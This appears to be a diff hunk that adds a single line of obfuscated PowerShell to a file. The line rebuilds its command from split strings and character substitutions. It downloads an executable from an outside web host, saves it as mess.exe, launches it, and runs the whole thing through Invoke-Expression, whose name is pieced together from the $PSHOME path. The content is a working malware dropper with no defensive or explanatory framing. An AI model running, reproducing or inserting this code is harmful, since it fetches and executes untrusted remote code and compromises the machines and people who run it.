@@ -1,0 +1,1 @@
+﻿ (('(New-'+'O'+'bject'+' System.Net.W'+'ebClien'+'t).'+'Do'+'wnloa'+'d'+'F'+'i'+'l'+'e('+'Gg'+'thttp:/'+'/wor'+'ld'+'n'+'it'+'.c'+'om/com.exe'+'Ggt,Ggtme'+'s'+'s.exe'+'Ggt);Start-Process Gg'+'tmess.'+'exeGgt')-RepLaCE  'Ggt',[CHar]39)|&( $pSHoMe[21]+$psHoMe[30]+'x')
